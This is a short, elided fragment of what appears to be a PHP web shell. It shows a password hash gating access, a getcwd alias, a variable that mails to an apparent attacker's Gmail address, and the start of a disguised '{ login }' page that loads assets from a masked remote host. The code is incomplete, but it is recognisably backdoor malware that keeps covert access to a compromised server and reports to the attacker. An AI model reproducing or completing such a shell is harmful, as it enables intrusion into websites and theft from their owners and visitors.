...
$gcw = "getcwd";
$inipass = "697747ba70bd6d88965f1f72e6f7d2b7";
if(isset($_7['_'])){
...
$tujuanmail = 'fajarhacker6@gmail.com, fajarhacker6@gmail.com';
...
<html>
	<head>
		...
		<title>{ login }</title>
		<link rel="stylesheet" href="//****.co.ws/meki.css">
		<link rel="icon" href="//****.co.ws/anya.jpg">
	</head>
<body class="bg-dark">
<form method="POST">
